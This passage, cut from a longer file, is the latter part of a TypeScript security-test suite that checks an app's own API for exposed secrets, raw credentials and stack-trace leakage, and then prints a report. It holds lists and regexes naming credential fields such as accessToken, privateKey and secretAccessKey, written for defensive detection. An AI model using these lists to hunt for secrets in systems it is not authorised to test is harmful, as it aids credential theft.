              'No PII detected in error responses across tested endpoints',
          };
        }

        return {
          status: 'fail' as const,
          details: `${failures.length} instances of potential PII in error responses`,
          evidence: failures.join('\n'),
          remediation:
            'Sanitize all error responses. Use structured error objects with safe messages only.',
        };
      },
    });
  }

  /**
   * DATA-002: Check for sensitive data exposure in API responses.
   */
  async testSensitiveDataExposure(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Data Protection',
      testName: 'Sensitive Data Exposure',
      description:
        'Verify that API responses do not include sensitive internal data (passwords, tokens, internal IPs)',
      severity: 'high',
      owasp: 'A02:2021 - Cryptographic Failures',
      fn: async () => {
        const sensitiveKeys = [
          'passwordHash',
          'password',
          'secret',
          'privateKey',
          'accessToken',
          'refreshToken',
          'internalIp',
          'dbPassword',
          'encryptionKey',
        ];

        const endpoints = [
          '/api/v1/frameworks',
          '/api/v1/team',
          '/api/health',
        ];

        const failures: string[] = [];

        for (const endpoint of endpoints) {
          const response = await this.request('GET', endpoint);
          const responseBody = JSON.stringify(response.data || '');

          for (const key of sensitiveKeys) {
            // Check for the key in the response (case-insensitive)
            const regex = new RegExp(`"${key}"\\s*:`, 'i');
            if (regex.test(responseBody)) {
              failures.push(
                `${endpoint}: contains sensitive key "${key}"`
              );
            }
          }
        }

        if (failures.length === 0) {
          return {
            status: 'pass' as const,
            details:
              'No sensitive data keys found in API responses',
          };
        }

        return {
          status: 'fail' as const,
          details: `${failures.length} instances of sensitive data in API responses`,
          evidence: failures.join('\n'),
          remediation:
            'Use DTOs/serializers to control what fields are included in API responses. Never expose internal fields.',
        };
      },
    });
  }

  /**
   * DATA-003: Verify encrypted fields return encrypted values.
   */
  async testEncryptionAtRest(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Data Protection',
      testName: 'Encryption at Rest Verification',
      description:
        'Verify that fields marked for encryption (credentials, tokens) return encrypted values in API responses',
      severity: 'medium',
      owasp: 'A02:2021 - Cryptographic Failures',
      fn: async () => {
        // Check integrations endpoint which may return credentials
        const response = await this.request(
          'GET',
          '/api/v1/integrations'
        );

        if (response.status === 401 || response.status === 403) {
          return {
            status: 'pass' as const,
            details:
              'Integration endpoint requires authentication. Encrypted fields are not exposed to unauthenticated users.',
          };
        }

        if (response.status === 200 && response.data) {
          const responseBody = JSON.stringify(response.data);

          // Check for the encryption prefix (enc_v1:) in credential fields
          const hasEncryptedPrefix = responseBody.includes('enc_v1:');
          const hasRawCredentials =
            /("accessKeyId"|"secretAccessKey"|"api_key"|"apiKey")\s*:\s*"(?!enc_v1:)[^"]+"/i.test(
              responseBody
            );

          if (hasEncryptedPrefix && !hasRawCredentials) {
            return {
              status: 'pass' as const,
              details:
                'Credential fields appear to be encrypted (enc_v1: prefix found)',
            };
          }

          if (hasRawCredentials) {
            return {
              status: 'fail' as const,
              details:
                'Raw credentials may be exposed in API responses',
              remediation:
                'Ensure all credential fields are encrypted using encryptField() before storage and never decrypted in API responses.',
            };
          }
        }

        return {
          status: 'info' as const,
          details:
            'Could not verify encryption at rest (endpoint not accessible or no credential data)',
        };
      },
    });
  }

  /**
   * DATA-004: Verify stack traces are not exposed in production errors.
   */
  async testErrorDetailLeakage(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Data Protection',
      testName: 'Error Detail Leakage',
      description:
        'Verify that error responses do not expose stack traces, file paths, or implementation details',
      severity: 'medium',
      owasp: 'A05:2021 - Security Misconfiguration',
      fn: async () => {
        const errorTriggers = [
          { method: 'GET' as const, path: '/api/v1/this-does-not-exist' },
          { method: 'POST' as const, path: '/api/v1/frameworks', data: {} },
          {
            method: 'GET' as const,
            path: '/api/v1/frameworks/not-a-valid-uuid',
          },
          {
            method: 'POST' as const,
            path: '/api/v1/auth/login',
            data: { email: '', password: '' },
          },
        ];

        const dangerousPatterns = [
          /at\s+\w+\s+\(/i, // Stack trace line: "at Function ("
          /node_modules\//i, // Node modules path
          /\.ts:\d+:\d+/i, // TypeScript file reference
          /\.js:\d+:\d+/i, // JavaScript file reference
          /Error:\s+/i, // Raw error messages
          /ECONNREFUSED/i, // Connection errors
          /\/home\/|\/usr\/|\/var\//i, // Unix paths
          /C:\\|D:\\/i, // Windows paths
        ];

        const failures: string[] = [];

        for (const trigger of errorTriggers) {
          const response = await this.request(
            trigger.method,
            trigger.path,
            { data: trigger.data }
          );

          const responseBody =
            typeof response.data === 'string'
              ? response.data
              : JSON.stringify(response.data || '');

          for (const pattern of dangerousPatterns) {
            if (pattern.test(responseBody)) {
              failures.push(
                `${trigger.path}: leaked pattern "${pattern.source}" in ${response.status} response`
              );
            }
          }
        }

        if (failures.length === 0) {
          return {
            status: 'pass' as const,
            details:
              'No stack traces or internal paths leaked in error responses',
          };
        }

        return {
          status: 'warning' as const,
          details: `${failures.length} instances of potential information leakage in error responses`,
          evidence: failures.join('\n'),
          remediation:
            'Use a centralized error handler that strips stack traces and internal details in production. Return generic error messages only.',
        };
      },
    });
  }

  // ==========================================================================
  // INTERNAL HELPERS
  // ==========================================================================

  /**
   * Execute a security test with timing and error handling.
   */
  private async runTest(params: {
    category: string;
    testName: string;
    description: string;
    severity: SecurityTestResult['severity'];
    owasp?: string;
    fn: () => Promise<{
      status: SecurityTestResult['status'];
      details: string;
      evidence?: string;
      remediation?: string;
    }>;
  }): Promise<SecurityTestResult> {
    this.testCounter++;
    const id = `SEC-${String(this.testCounter).padStart(3, '0')}`;
    const start = Date.now();

    this.log(`Running ${id}: ${params.testName}...`);

    try {
      const result = await params.fn();
      const durationMs = Date.now() - start;

      const testResult: SecurityTestResult = {
        id,
        category: params.category,
        testName: params.testName,
        description: params.description,
        severity: params.severity,
        status: result.status,
        details: result.details,
        evidence: result.evidence,
        remediation: result.remediation,
        owasp: params.owasp,
        timestamp: new Date(),
        durationMs,
      };

      this.results.push(testResult);
      this.log(
        `  ${id}: ${result.status.toUpperCase()} (${durationMs}ms)`
      );

      return testResult;
    } catch (error: any) {
      const durationMs = Date.now() - start;

      const testResult: SecurityTestResult = {
        id,
        category: params.category,
        testName: params.testName,
        description: params.description,
        severity: params.severity,
        status: 'error',
        details: `Test execution error: ${error.message}`,
        evidence: error.stack?.substring(0, 500),
        owasp: params.owasp,
        timestamp: new Date(),
        durationMs,
      };

      this.results.push(testResult);
      this.log(`  ${id}: ERROR (${durationMs}ms) - ${error.message}`);

      return testResult;
    }
  }

  /**
   * Make an HTTP request with error handling (does not throw on HTTP errors).
   */
  private async request(
    method: 'GET' | 'POST' | 'PUT' | 'DELETE' | 'PATCH',
    path: string,
    options: {
      headers?: Record<string, string>;
      data?: any;
    } = {}
  ): Promise<{
    status: number;
    data: any;
    headers: Record<string, string>;
  }> {
    try {
      const response: AxiosResponse = await axios({
        method,
        url: `${this.config.baseUrl}${path}`,
        headers: {
          'Content-Type': 'application/json',
          ...options.headers,
        },
        data: options.data,
        timeout: this.config.timeout,
        validateStatus: () => true, // Don't throw on any status code
        maxRedirects: 0, // Don't follow redirects
      });

      return {
        status: response.status,
        data: response.data,
        headers: response.headers as Record<string, string>,
      };
    } catch (error: any) {
      // Network errors, timeouts, etc.
      if (error.response) {
        return {
          status: error.response.status,
          data: error.response.data,
          headers: error.response.headers || {},
        };
      }

      return {
        status: 0,
        data: null,
        headers: {},
      };
    }
  }

  /**
   * Build the final penetration test report from collected results.
   */
  private buildReport(): PenetrationTestReport {
    const failedResults = this.results.filter(
      (r) => r.status === 'fail'
    );
    const warningResults = this.results.filter(
      (r) => r.status === 'warning'
    );

    return {
      testDate: new Date(),
      environment: this.config.baseUrl,
      totalTests: this.results.length,
      passed: this.results.filter((r) => r.status === 'pass').length,
      failed: failedResults.length,
      warnings: warningResults.length,
      criticalFindings: failedResults.filter(
        (r) => r.severity === 'critical'
      ).length,
      highFindings: failedResults.filter(
        (r) => r.severity === 'high'
      ).length,
      mediumFindings: failedResults.filter(
        (r) => r.severity === 'medium'
      ).length,
      lowFindings: failedResults.filter(
        (r) => r.severity === 'low'
      ).length,
      results: this.results,
    };
  }

  /**
   * HTML-escape a string (for XSS detection comparison).
   */
  private escapeHtml(str: string): string {
    return str
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');
  }

  /**
   * Conditional logging based on verbose setting.
   */
  private log(message: string): void {
    if (this.config.verbose) {
      console.log(`[PenTest] ${message}`);
    }
  }
}

// ============================================================================
// CLI RUNNER
// ============================================================================

async function main(): Promise<void> {
  console.log('============================================================');
  console.log('  ComplyEasyAI Penetration Test Suite');
  console.log('============================================================');

  const engine = new SecurityTestEngine({
    verbose: true,
    timeout: 15000,
  });

  const report = await engine.runAllTests();

  console.log('\n============================================================');
  console.log('  RESULTS');
  console.log('============================================================');
  console.log(`  Total Tests:        ${report.totalTests}`);
  console.log(`  Passed:             ${report.passed}`);
  console.log(`  Failed:             ${report.failed}`);
  console.log(`  Warnings:           ${report.warnings}`);
  console.log(`  Critical Findings:  ${report.criticalFindings}`);
  console.log(`  High Findings:      ${report.highFindings}`);
  console.log(`  Medium Findings:    ${report.mediumFindings}`);
  console.log(`  Low Findings:       ${report.lowFindings}`);
  console.log('============================================================\n');

  // Generate and output the full markdown report
  const markdownReport = engine.generateReport(report);
  console.log(markdownReport);

  // Exit with error if critical or high findings exist
  process.exit(
    report.criticalFindings > 0 || report.highFindings > 0 ? 1 : 0
  );
}

// Run if executed directly
if (require.main === module) {
  main().catch(console.error);
}

export default SecurityTestEngine;
